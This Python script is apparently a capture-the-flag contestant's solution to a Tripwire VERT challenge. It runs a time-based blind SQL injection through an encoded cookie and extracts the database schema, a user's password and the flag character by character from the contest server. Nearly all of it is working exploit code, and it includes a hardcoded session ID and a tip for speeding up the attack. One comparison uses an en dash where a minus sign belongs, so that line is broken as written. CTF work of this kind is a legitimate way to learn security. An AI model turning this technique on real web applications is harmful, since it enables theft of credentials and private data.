#
# This is a cleaned up version of the code I wrote for the blind SQL injection 
# in the second level of Tripwire VERT's Cyber Security Capture The Flag Contest
# 
# The specific code below is written for an account with user and display name
# of '33' (without the quotes), but can be adapted as needed, where 
# VCK = enc(username), VAL = display name, and SID is your current PHPSESSID 
# for which you are logged in as this user.
#
# If you would like to make the code faster, consider using error-based 
# injection in combination with binary search.
#
# For more details and context, please visit my guest posts at Tripwire's blog:
# http://www.tripwire.com/state-of-security/off-topic/how-i-captured-the-flags-in-tripwire-verts-cyber-security-contest-part-1/
# and
# http://www.tripwire.com/state-of-security/off-topic/how-i-captured-the-flags-in-tripwire-verts-cyber-security-contest-part-2/
# or at my personal website:
# https://ilias.giechaskiel.com/posts/tripwire_ctf/index.html
#

import zlib
import base64
import urllib
import requests
import time
import sys

def enc(a):
	t = a.encode('zlib').encode('base64')
	return urllib.quote_plus(t[0:len(t)-1])


SID = 'ici27hh3mf36lo5huted1q5jp4'
VCK = 'eJwzNgYAAJsAZw%3D%3D'
VAL = '33'
SLEEP = 2

def makereq(s):
	url = 'http://dc22.secur3.us/chal2/insert.php'
	cookies = dict(PHPSESSID=SID,VCK=VCK,ZFT=enc(s))
	params = {'note': 'mynote', 'SUBMIT': 'Record Thought'}

	r = requests.post(url, cookies=cookies, data=params)
	return r
	

l = VAL + "' + IF((SELECT ASCII(MID("
lm= ","
m = ",1)) "
mr= ")=" 
r = ", SLEEP(" + str(SLEEP) + "), 0) + '" + VAL


def inject(column, table):
	offset = 1
	b = l + column + lm
	while (True):
		b1 = b + str(offset) + m + table + mr
		done = True
		for val in range(20, 127):
			s = b1 + str(val) + r
			
			t1 = time.time()
			makereq(s)
			t2 = time.time()
			if (t2 - t1 > SLEEP – 0.5):
				done = False
				sys.stdout.write(chr(val))
				sys.stdout.flush()				
				break
				
		if (done):
			break
				
		offset = offset + 1
	
	sys.stdout.write('\n')


print 'Database name'
inject('DATABASE()', '')

print 'Table name'
inject('TABLE_NAME', "FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='ctf2' LIMIT 1 OFFSET 0")

for i in range(3):
	print 'Column names ' + str(i)
	inject('COLUMN_NAME', "FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='notes' LIMIT 1 OFFSET " + str(i))
	
print 'Password for flag'
inject('password', "FROM registrations WHERE username='flag' LIMIT 1")

print 'Flag'
inject('c.note', "FROM ctf2.notes c WHERE c.username='flag' LIMIT 1")
